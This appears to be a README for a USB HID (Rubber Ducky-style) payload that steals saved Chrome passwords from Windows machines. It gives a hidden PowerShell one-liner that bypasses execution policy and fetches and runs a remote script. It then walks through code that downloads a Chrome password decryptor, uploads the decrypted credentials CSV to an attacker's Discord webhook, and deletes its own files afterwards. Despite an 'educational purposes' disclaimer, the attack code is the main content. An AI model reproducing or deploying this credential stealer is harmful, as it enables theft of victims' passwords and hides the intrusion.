THIS SCRIPT IS ONLY INTENDED FOR EDUCATIONAL PURPOSES
(decrypt script made by ohyicong)

# What it does

This payload downloads and executes a powershell script that downloads a python chrome password decryptor, and then sends the decrypted passwords over discord using webhooks.

# Dependencies:
- Windows
- Python

# How it Works:

(This code is very unoptimized, but i havent bothered fixing it)

## The rubber ducky script
When the grabber.dd runs it opens a run dialoge and enters this script.

```powershell
powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/bMQ15 | iex
```
This line opens a hidden windows with ``-W h`` a non interactive windows with ``-NonI`` no user profiles with ``NoP`` and bypasses the anti script execution policy using ``-Ep bypass``
Then it sets the ``$dc`` variable to your webhook.
And last but not least it downloads the starter.ps1 script and executes it. The download link is shortened to fit inside the run dialoge. (I want to host my own site in the future where i can have my own directly short links)

## The powershell script

The powershell script is used as sort of a base of operations, it downlaods the python password decryptor and sends the file over discord. Heres how it works:

### Extracting the passwords:

To extract the passwords saved in chrome we use a python script made by ohyicong, if you are interested in how it works you can read his [medium article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d)

First we tell powershell where python is located on the system so we can use it to execute the script:
```powershell
$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
```
Then we install the needed python libraries, if the user already have the libraries pip will automaticly cancel the installation and the script will proceed wither way.
```powershell
py -m pip install pycryptodomex pywin32
```
Then we download the python script the same way the rubber ducky script downloaded the ```starter.ps1``` scrip:
```powershell
Invoke-WebRequest -Uri https://github.com/simen64/Pico-HID-Scripts/blob/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
```
Now we run the python script using this line. The ```&``` tells powershell to execute a command. The ```$env``` variable is where python is located and the ```$Env``` variable is where the python script is saved from the previous step
```powershell
& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
```

### Sending the passwords over Discord

This part of the code is what takes the decrypted passwords file and sends it to you over discord.

First we define the user thats logged into the computer, this will be used to acces folders like ```C:\Users\User\Documents\```
```powershell
$user = $env:USERNAME
```
Then we use the now defined &user variable to define where the file ```decrypted_password.csv``` file is stored, this file contains the passwords that the python script previosly extracted.
```powershell
$file = "C:\Users\$user\Documents\decrypted_password.csv"
```
This variable plains and simple tells discord what message to deliver the file with
```powershell
$message = "Extracted passwords:"
```
This line of code is used to generate a unique identifier for the message each time the script is ran
```powershell
$boundary = [System.Guid]::NewGuid().ToString()
```
Here we read the ```decrypted_password.csv``` file from the previously defined ```$file``` variable and saves it into a variable called ```$fileContent```
```powershell
$fileContent = [System.IO.File]::ReadAllBytes($file)
```
This code takes all of the now gathered information and puts it into an array called ```$bodyLines``` that is joined to one string in a variable called ```body```
```powershell
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"content`"",
    "",
    $message,
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"file.txt`"",
    "Content-Type: application/octet-stream",
    "",
    [System.Text.Encoding]::Default.GetString($fileContent),
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"
```
After that is gathered we have to define the http headers for the webhook, we set the header to ```multipart/form-data``` so it know that we are sending a file. Then we give the request or unique identifier with the variable ```$boundary``` that we generated earlier.
```powershell
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}
```
Last but not least we invoke a web request to our webhook with all of our information. This includes setting the request to POST, including the headers and the body.
```powershell
Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
```
And after the script is done it self destructs and deletes all the files downloaded, ```$MyInvocation.MyCommand.Source``` is a built in powershell variable that defines the script that its being called from.
```powershell
Remove-Item stealer.py -Force
Remove-item decrypted_password.csv -Force
Remove-Item -Path $MyInvocation.MyCommand.Source
```
